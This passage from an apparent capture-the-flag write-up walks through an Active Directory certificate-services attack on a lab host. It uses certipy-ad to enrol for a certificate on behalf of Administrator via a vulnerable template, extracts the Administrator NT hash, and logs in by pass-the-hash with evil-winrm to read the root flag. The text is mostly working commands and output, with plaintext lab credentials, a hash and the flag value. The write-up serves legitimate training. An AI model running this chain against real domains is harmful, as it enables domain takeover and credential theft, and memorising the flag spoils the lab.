we used template WebServer because it was enable and is vulnerable 
```
certipy-ad req -u cert_admin@tombwatcher.htb -p 'Certadmin123!' -target 10.129.204.168 -template WebServer -ca tombwatcher-CA-1 -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent'  
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: TOMBWATCHER.HTB.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: TOMBWATCHER.HTB
[*] Requesting certificate via RPC
[*] Request ID is 19
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

now we will use the PFX to request a ticket as Administrator for a template that is meant for user login and get the hash
we used template user because it was enable and let us login 
```
certipy-ad req -u cert_admin -p 'Certadmin123!' -dc-ip 10.129.204.168 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx administrator.pfx -on-behalf-of 'tombwatcher\Administrator'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 20
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.204.168                                                                                                                                                        
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

```
evil-winrm -i 10.129.204.168 -u Administrator -H f61db423bebe3328d33af26741afe5fc
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
8a386c9bf7ea2ac42a2e3c334b0474e5
```

got the root flag